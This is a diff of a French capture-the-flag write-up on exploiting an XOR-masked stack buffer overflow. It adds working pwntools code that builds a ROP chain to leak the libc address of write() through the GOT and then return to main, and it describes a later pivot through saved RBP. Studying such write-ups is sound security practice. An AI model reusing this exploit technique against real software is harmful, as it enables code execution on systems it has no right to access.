@@ -371,66 +371,63 @@ Quelques contraintes jusque là :
 
 En effet, on passe les tests d'arrêt de la boucle, mais ce que l'on va overflow sur la stack c'est `buff[j] = user_pass[j] ^ rand_tab_2[j];` donc si on veut pouvoir insérer un payload, celui-ci devra être préalablement xoré avec tab_2 (pour que les xor s'annulent).
 
+Par ailleurs nous allons rapidement rencontrer une limite sur la taille du payload. En effet, on a besoin de maîtriser les valeurs avec lesquelles il va être xoré (c'est à dire tab_2). Les 4 premiers QWORD de `tab_2` vont xorer le `user_pass` pour remplir `buff`, le QWORD suivant va permettre de déborder de 8 octets sur la stack, en revanche l'octet d'après va écraser `j` notre compteur de boucle ...
+
+Pour celui-ci, on va donc précalculer l'offset du `saved RIP` pour que les octets d'après écrasent l'écrase directement, mais ce faisant nous faisons un saut dans notre `tab_2` (donc moins de valeurs prédictibles pour préparer notre paload xoré, même si on peut en grignoter un peu) et surtout le même saut dans `user_name` dont la taille est limitée à `0x80`.
+
+Avec quelques tests, ou un peu de maths, on voit qu'on va devoir se limiter à des payload de 9 QWORD.
+
+#### Leak the libc
+
+Rappelons nous que la stack est non exécutable, que l'on a pas accès aux syscalls pour mapper une zone mémoire en RWX, et que de toute façon avec 9 x 8 = 72 octets ça serait compliqué.
+
+On va donc envisager une ROPchain, mais nous sommes un peu limités en gadgets dans le binaire (et puis si le concépteur du chall nous file la libc, ce n'est pas pour rien ! )
+
+Pour cela, on va faire un appel à `write`, en lui demandant d'afficher l'adresse de write dans la got, et on termine notre payload par un rappel de `main()` pour pouvoir renvoyer un second payload.
+
+```python
+sc1 = p64(pop_rdi)
+sc1 += p64(0x01)
+sc1 += p64(pop_rsi_r15)
+sc1 += p64(write_got)
+sc1 += p64(0xff)
+sc1 += p64(edx)
+sc1 += p64(ret) #align stack
+sc1 += p64(write_plt)
+sc1 += p64(main)
+
+sc1_xor = b''
+for i in range(len(sc1)):
+  sc1_xor += struct.pack("B",(tab_2[0x38+i]^sc1[i]))
+
+name = b'A' * 8
+name += struct.pack("B",(tab_2[40]^0x37)) # ecraser le compteur de boucle pour pointer sur le saved RIP
+name += b'A' * (0x38 - 0x20 - len(name))
+name += sc1_xor
+name += b'\x00'
+
+name = name + b'A' * (0x80 - len(name))
+
+rep = r.recvuntil(b'identifiant.\n')
+print(rep)
+
+r.send(name)
+rep = r.recvuntil(b'passe.\n')
+r.send(password1)
+print(rep)
+log.success("First payload sent")
+
+rep = r.recv()
+
+write_leak = u64(rep[:8])
+log.success("Leak write leak : " + hex(write_leak))
+```
+
+#### What next ?
+
+Je vais passer sur les différents et très nombreux échecs pour trouver la suite (ce qui explique que le code joint soit un peu décousu même si j'ai essayé de le remettre au propre et de commenter a minima).
 
 
-stack check_pass
+Tout d'abord, le rappel de main() s'effectue correctement mais, le second paylaod faisait planter le programme, du coup au lieu d'écraser `saved_RIP`, je vais faire pointer `j` un peu plus haut pour écraser `saved_RBP` et avoir une sorte de pivot sur la stack.
 
-0x7fffffffdd50: 0x00007ffff7fb1540  0x00007fffffffdee0
-tab_1
-0x7fffffffdd60: 0xe3f2ba294a516967  0xc9332e76e71b547c
-0x7fffffffdd70: 0x5e580525a3310d66  0xdc21740e549bcdab
-0x7fffffffdd80: 0x6bea7e3efc413e70  0xdbec3c323bec5c8f
-0x7fffffffdd90: 0x7c05d1fbaafbfe02  0xf1b10fa85c89be75
-0x7fffffffdda0: 0x6448cbca3ae9f705  0x795e5a14641c1e1f
-0x7fffffffddb0: 0xaf1bacaa0911643b  0x7dba22bb1548e333
-0x7fffffffddc0: 0x4eb51bf8f87f1a0b  0x6cfa4ebc3d793898
-0x7fffffffddd0: 0x5c3bb5be55aa21ac  0x4efd154fe4e2b336
-tab_2
-0x7fffffffdde0: 0x47fbabcdedff73c7  0x9b9f635b8de9f9c3
-0x7fffffffddf0: 0xd5e9175d5b59b733  0x873d418311b5c7b3
-0x7fffffffde00: 0x97dd970167e1a1e9  0x5d1955affbb12b39
-0x7fffffffde10: 0x953de7293bfb431b  0xb3eb9599bbf961d9
-0x7fffffffde20: 0xbd47d10be5a101ef  0x634bc573c57ba923
-0x7fffffffde30: 0x3b11f3d5dd9f2571  0xf59b196f5d4751cd
-0x7fffffffde40: 0xe9cb13a529231de1  0x05cb775f354de133
-0x7fffffffde50: 0xd3057371a31b2b87  0xa98349339ff1af95
-buff
-0x7fffffffde60: 0xe3f2ba294a516967  0xc9332e76e71b547c
-0x7fffffffde70: 0x5e580525a3310d66  0xdc21740e549bcdab
-
-0x7fffffffde80: 0xd69cd64026a0e0a8  0x00000080000000fe
-0x7fffffffde90: 0x00007fffffffdfe0  0x00000000004015d1
-
-stack main
-
-String_2
-0x7fffffffdea0: 0x6c6c69756556202d  0x6f73a9c364207a65
-0x7fffffffdeb0: 0x6173207369616d72  0x746f762072697369
-0x7fffffffdec0: 0x6420746f6d206572  0x2e65737361702065
-0x7fffffffded0: 0x000003400000000a  0xe8c20872deb0ee40
-user_pass
-0x7fffffffdee0: 0xa2b3fb680b102826  0x88726f37a65a153d
-0x7fffffffdef0: 0x1f194464e2704c27  0x9d60354f15da8cea
-
-user_name
-0x7fffffffdf00: 0xa3f2b33648c589ea  0x276c20f2757320cd
-0x7fffffffdf10: 0x6361198d9a8bb189  0x6e6f6320652435b4
-0x7fffffffdf20: 0x0d4c071a0c2e4543  0x0a01cfa50b635a10
-0x7fffffffdf30: 0x6b5200071b0e0b5f  0x1806034524495e63
-0x7fffffffdf40: 0x1749151c4d5a001e  0x4b17071c1750520c
-0x7fffffffdf50: 0x6669772e6564692a  0x4141025caade8f29
-0x7fffffffdf60: 0x4141414141414141  0x4141414141414141
-0x7fffffffdf70: 0x4141414141414141  0x4141414141414141
-
-String_1
-0x7fffffffdf80: 0x756e65766e656942  0x276c207275732065
-0x7fffffffdf90: 0x6361667265746e69  0x6e6f632065642065
-0x7fffffffdfa0: 0x61206e6f6978656e  0x657266666f432075
-0x7fffffffdfb0: 0x0a212074726f662d  0x6c69756556202d0a
-0x7fffffffdfc0: 0x73696173207a656c  0x6572746f76207269
-0x7fffffffdfd0: 0x6669746e65646920  0x00000a2e746e6169
-0x7fffffffdfe0: 0x00000000004015e0  0x00007ffff7e11d0a
-0x7fffffffdff0: 0x00007fffffffe0d8  0x00000001ffffe3e9
-0x7fffffffe000: 0x000000000040135e  0x00007ffff7e118e9
-
------
+Par ailleurs pour chaque payload successif envoyer, il faut bien penser à recalculer les valeurs `rand()` de `tab_1` et `tab_2`, car le programme ne s'est pas arrêté, et le générateur de pseudo aléa continue à la suite : [genere_rand.c](genere_rand.c)
